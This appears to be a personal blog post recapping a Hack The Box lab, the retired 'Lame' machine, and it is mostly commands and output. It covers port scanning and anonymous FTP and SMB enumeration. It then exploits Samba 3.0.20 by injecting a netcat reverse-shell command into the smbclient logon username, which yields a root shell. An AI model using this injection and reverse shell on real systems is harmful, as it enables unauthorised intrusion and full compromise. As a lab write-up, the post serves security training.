@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author"
+    content="">
+<meta name="description"
+    content="0x0 Intro    Name Values     Machine Name Lame   Difficulty Easy   Retired True   Release Date 1686 Days   Machine IP 10.10.10.3    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.3 --ulimit 10000 -- -sV -sC -A -T5 -Pn PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/recap-htb-lame/" />
+
+
+<title>
+    
+    Recap HTB: Lame :: Hello World. I am Dito Prabowo 
+    
+</title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.min.1e3781b80dd16493473cb3568a87d70e1a30cee34b5558dc6a9114b007652d4d.css">
+
+
+
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#252627">
+<link rel="shortcut icon" href="/favicon.ico">
+<meta name="theme-color" content="#252627"><meta itemprop="name" content="Recap HTB: Lame">
+<meta itemprop="description" content="0x0 Intro    Name Values     Machine Name Lame   Difficulty Easy   Retired True   Release Date 1686 Days   Machine IP 10.10.10.3    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.3 --ulimit 10000 -- -sV -sC -A -T5 -Pn PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2."><meta itemprop="datePublished" content="2021-10-26T18:20:32+07:00" />
+<meta itemprop="dateModified" content="2021-10-26T18:20:32+07:00" />
+<meta itemprop="wordCount" content="425"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="hackthebox,oscp-like,ctf," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/"/>
+
+<meta name="twitter:title" content="Recap HTB: Lame"/>
+<meta name="twitter:description" content="0x0 Intro    Name Values     Machine Name Lame   Difficulty Easy   Retired True   Release Date 1686 Days   Machine IP 10.10.10.3    0x1 Enumeration Nmap/Rustscan Lets start to enumerate the machine first, using this command :
+$ rustscan -a 10.10.10.3 --ulimit 10000 -- -sV -sC -A -T5 -Pn PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack vsftpd 2."/>
+
+
+
+
+<meta property="article:published_time" content="2021-10-26 18:20:32 &#43;0700 WIB" />
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /home/dmcr7</span>
+            <span class="logo__cursor"></span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>2 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title"><a href="/posts/recap-htb-lame/">Recap HTB: Lame</a></h1>
+
+            
+
+            <div class="post-content">
+                <h2 id="0x0-intro">0x0 Intro</h2>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align:right">Values</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine Name</td>
+<td style="text-align:right">Lame</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td style="text-align:right">Easy</td>
+</tr>
+<tr>
+<td>Retired</td>
+<td style="text-align:right">True</td>
+</tr>
+<tr>
+<td>Release Date</td>
+<td style="text-align:right">1686 Days</td>
+</tr>
+<tr>
+<td>Machine IP</td>
+<td style="text-align:right">10.10.10.3</td>
+</tr>
+</tbody>
+</table>
+<h2 id="0x1-enumeration">0x1 Enumeration</h2>
+<h3 id="nmaprustscan">Nmap/Rustscan</h3>
+<p>Lets start to enumerate the machine first, using this command :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rustscan -a 10.10.10.3 --ulimit <span style="color:#ae81ff">10000</span> -- -sV -sC -A -T5 -Pn
+
+PORT    STATE SERVICE     REASON  VERSION
+21/tcp  open  ftp         syn-ack vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.18
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         syn-ack OpenSSH 4.7p1 Debian 8ubuntu1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">1024</span> 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd <span style="color:#f92672">(</span>DSA<span style="color:#f92672">)</span>
+| ...
+139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+445/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X <span style="color:#f92672">(</span>workgroup: WORKGROUP<span style="color:#f92672">)</span>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>So open port on this machine are ftp, ssh, and smb. Try to enumerate more.</p>
+<p>Try to access FTP it success login using anonymous, but nothing there and cant list other directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ftp 10.10.10.3
+
+Connected to 10.10.10.3.
+<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 2.3.4<span style="color:#f92672">)</span>
+Name <span style="color:#f92672">(</span>10.10.10.3:dito<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">331</span> Please specify the password.
+Password:
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls -la
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> .
+drwxr-xr-x    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">65534</span>        <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2010</span> ..
+<span style="color:#ae81ff">226</span> Directory send OK.
+
+</code></pre></div><p>Enumerate on Samba :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3
+protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
+
+$ smbclient -L <span style="color:#ae81ff">\\\\</span>10.10.10.3 --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+        ADMIN$          IPC       IPC Service <span style="color:#f92672">(</span>lame server <span style="color:#f92672">(</span>Samba 3.0.20-Debian<span style="color:#f92672">))</span>
+
+$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> 
+</code></pre></div><p>But we got information it using samba <code>3.0.20-Debian</code>. In that version there is vulnerabiliry command injection. Try it :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient <span style="color:#ae81ff">\\\\</span>10.10.10.3<span style="color:#ae81ff">\\</span>tmp --option<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;client min protocol=NT1&#39;</span>
+Enter WORKGROUP<span style="color:#ae81ff">\d</span>ito<span style="color:#e6db74">&#39;&#39;</span>s password:
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> logon <span style="color:#e6db74">&#34;/=`nohup nc -e /bin/sh 10.10.14.18 9000`&#34;</span>
+Password:
+session setup failed: NT_STATUS_IO_TIMEOUT
+smb: <span style="color:#ae81ff">\&gt;</span>
+
+$ nc -lnvp <span style="color:#ae81ff">9000</span>
+Listening on 0.0.0.0 <span style="color:#ae81ff">9000</span>
+Connection received on 10.10.10.3 <span style="color:#ae81ff">51520</span>
+id
+uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+whoami
+root
+</code></pre></div><p>Instanly get root :D</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="/tags/hackthebox">hackthebox</a></span><span class="tag"><a href="/tags/oscp-like">oscp-like</a></span><span class="tag"><a href="/tags/ctf">ctf</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>425 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2021-10-26 18:20 &#43;0700</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Read other posts</span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+
+                    
+                        <span class="button next">
+                            <a href="/posts/recap-htb-sense/">
+                                <span class="button__text">Recap HTB: Sense</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+
+        	
+<div id="comments" class="thin">
+      		    <div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+      
+      
+      if (window.location.hostname == "localhost")
+                return;
+
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      var disqus_shortname = 'dmcr7';
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+      		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2021</span>
+            
+            <span></span>
+            <span> <a href="/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+
+    <div class="footer__inner">
+        <div class="footer__content">
+
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+
+
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.766584e6ea536f54faf86b018d73f719fc520199a6c4d32cbd959eb87634c11b380ac646d80d67304313aac0f5f05e6715221bd99a619bbc905365b55f78147f.js" integrity="sha512-dmWE5upTb1T6&#43;GsBjXP3GfxSAZmmxNMsvZWeuHY0wRs4CsZG2A1nMEMTqsD18F5nFSIb2Zphm7yQU2W1X3gUfw=="></script>
+
+
+
+    </body>
+</html>
